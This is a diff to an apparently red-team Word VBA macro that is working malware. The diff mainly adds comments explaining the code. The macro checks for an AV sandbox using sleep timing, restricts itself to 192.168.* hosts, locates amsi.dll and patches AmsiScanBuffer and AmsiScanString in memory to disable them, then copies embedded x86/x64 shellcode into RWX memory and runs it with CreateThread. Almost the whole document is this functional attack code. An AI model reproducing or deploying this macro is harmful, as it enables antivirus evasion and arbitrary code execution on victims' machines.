@@ -14,6 +14,7 @@ Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hPro
 Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
 
 Function MyMacro()
+ 'Get current time, sleep 4 seconds, get time again.  If less than 4 seconds have passed, assume we are in a AV sandbox and exit without running rest of macro.
  Dim myTime
  myTime = Time
  Dim Timein As Date
@@ -30,6 +31,7 @@ Function MyMacro()
  If subtime < 3.5 Then
     Exit Function
  End If
+ 'initialize variables
  Dim Is64 As Boolean
  Dim StrFile As String
  Dim check As Boolean
@@ -41,23 +43,29 @@ Function MyMacro()
  Dim ipcheck As Boolean
  ipcheck = False
  Dim inscope As String
+ 'define in scope IP's.  We can use wildcards here.
  inscope = "192.168.*"
+ 'Call ip check function.  Returns True if machine IP is in scope. If True, pass.  If False, exit.
  ipcheck = getMyIP(inscope)
  If ipcheck Then
-    Debug.Print ("ip in scope!")
  Else
     Exit Function
  End If
+ 'Dynamically resolve amsi.dll
  StrFile = Dir("c:\windows\system32\a?s?.d*")
+ 'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True.
  Is64 = arch()
+ 'Call amsi check function to determine if amsi.dll is loaded into Word. This is the case in word 2019+. Returns True if Amsi is found.
  check = amcheck(StrFile)
  'This portion to delete document body and replace with auto text (the "legit" content)
  'ActiveDocument.Content.Select
  'Selection.Delete
  'ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
+ 'If amsi is found, call amsi patching function.  Pass architecture of Word as additional arg to function.
  If check Then
      patch StrFile, Is64
  End If
+ 'Include shellcode for both x86 and x64.
  If Is64 Then
     buf = Array(72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 81, 72, 139, 82, 32, 86, 72, 15, 183, 74, 74, 72, 139, 114, 80, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
     11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 68, 139, 64, 32, 139, 72, 24, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
@@ -74,21 +82,28 @@ Function MyMacro()
     94, 94, 255, 12, 36, 15, 133, 112, 255, 255, 255, 233, 155, 255, 255, 255, 1, 195, 41, 198, 117, 193, 195, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
 
 End If
+'Create new space in memory within current process
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+ 'Copy shellcode to newly created memory
  For counter = LBound(buf) To UBound(buf)
  data = Hex(buf(counter))
  patched ByVal (addr + counter), 1, ByVal ("&H" & data)
  Next counter
+ 'create thread to execute shellcode
  res = CreateThread(0, 0, addr, 0, 0, 0)
 End Function
+
  Function arch() As Boolean
+ 'check architecture of current word process
     #If Win64 Then
         arch = True
     #Else
         arch = False
     #End If
 End Function
+
 Public Function getMyIP(ipcheck As String) As Boolean
+'uses WMI to get all IP's associated with machine.  Each one is then checked against the wildcarded IP/network.  If a match is found, returns True
     Dim objWMI As Object
     Dim objQuery As Object
     Dim objQueryItem As Object
@@ -105,8 +120,28 @@ Public Function getMyIP(ipcheck As String) As Boolean
         Next
     Next
 End Function
-Function patch(StrFile As String, Is64 As Boolean)
 
+Function amcheck(StrFile As String) As Boolean
+'Checks for amsi.dll in word process. If found, returns True
+Dim szProcessName As String
+Dim mdi As MODULEINFO
+Dim hMod(0 To 1023) As LongPtr
+Dim res As LongPtr
+amcheck = False
+res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
+For i = 0 To UBound(hMod)
+    szProcessName = String$(50, 0)
+    GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
+    If Left(szProcessName, 8) = StrFile Then
+        amcheck = True
+   End If
+Next i
+
+End Function
+
+Function patch(StrFile As String, Is64 As Boolean)
+'patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.  The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them. 
+' Depending on architecture these offsets vary, so a case is included for x86 and x64
 Dim lib As LongPtr
 Dim Func_addr As LongPtr
 Dim temp As LongPtr
@@ -138,23 +173,8 @@ patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
 temp = VirtPro(ByVal Func_addr, 32, old, 0)
 
 End Function
-Function amcheck(StrFile As String) As Boolean
 
-Dim szProcessName As String
-Dim mdi As MODULEINFO
-Dim hMod(0 To 1023) As LongPtr
-Dim res As LongPtr
-amcheck = False
-res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
-For i = 0 To UBound(hMod)
-    szProcessName = String$(50, 0)
-    GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
-    If Left(szProcessName, 8) = StrFile Then
-        amcheck = True
-   End If
-Next i
-
-End Function
+'macro name is test which calls the main method
 Sub test()
  MyMacro
 End Sub
